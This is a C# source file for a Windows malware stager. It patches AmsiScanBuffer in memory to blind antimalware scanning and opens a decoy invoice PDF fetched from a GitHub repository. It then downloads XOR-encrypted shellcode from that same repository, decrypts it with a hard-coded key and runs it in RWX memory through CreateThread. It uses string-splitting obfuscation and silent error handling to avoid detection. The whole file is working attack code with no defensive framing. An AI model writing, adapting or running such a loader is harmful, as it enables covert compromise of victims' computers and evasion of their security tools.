using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO; // NEW: Added for Path manipulation

public class EvasionExecutor
{
  // --- Win32 API Functions ---
  [DllImport("kernel32.dll")] private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32.dll")] private static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32.dll")] private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
  [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
  private static byte[] xorKey = new byte[] { 0x69, 0x30, 0x78, 0x75, 0x46, 0x6e, 0x5a, 0x4f, 0x66, 0x36, 0x39, 0x58, 0x37, 0x62, 0x6b, 0x74, 0x66, 0x33, 0x56, 0x73 };

  // Renamed for minor obfuscation
  public void Trigger() 
  {
    // First, patch AMSI
    PatchMem();

    // NEW: Wrap main logic in a try/catch to prevent ANY crash reports (WerFault.exe)
    try
    {
      // --- STAGE 2, ACTION 2: Improved Decoy Action ---
      using (WebClient pdfClient = new WebClient())
      {
        // Get a temporary path. e.g., C:\Users\tanal\AppData\Local\Temp\tmpA1B2.tmp.pdf
        string tempPdfPath = Path.GetTempPath() + Path.GetRandomFileName() + ".pdf";
        
        // Download the PDF to the temporary local file
        pdfClient.DownloadFile("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/Invoice%20for%20Load%20ID%2080814532.pdf", tempPdfPath);
        
        // Now, open the LOCAL PDF file. This will reliably open in the default PDF viewer.
        Process.Start(tempPdfPath);
      }

      // --- STAGE 2, ACTION 3: Download & DeXOR Payload ---
      using (WebClient payloadClient = new WebClient())
      {
        payloadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
        byte[] encryptedShellcode = payloadClient.DownloadData("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor");
        
        byte[] shellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
          shellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }

        // --- STAGE 2, ACTION 4: Inject and Execute ---
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
      }
    }
    catch {} // If anything fails, just exit silently. No crash.
  }

  // Renamed for minor obfuscation
  private void PatchMem()
  {
    try
    {
      string lib = "am" + "si" + ".dll";
      string func = "Amsi" + "Scan" + "Buffer";

      IntPtr libHandle = LoadLibrary(lib);
      IntPtr funcAddress = GetProcAddress(libHandle, func);
      
      byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
      
      uint oldProtect;
      VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);
      Marshal.Copy(patch, 0, funcAddress, patch.Length);
      VirtualProtect(funcAddress, (UIntPtr)patch.Length, oldProtect, out oldProtect);
    }
    catch {}
  }
}
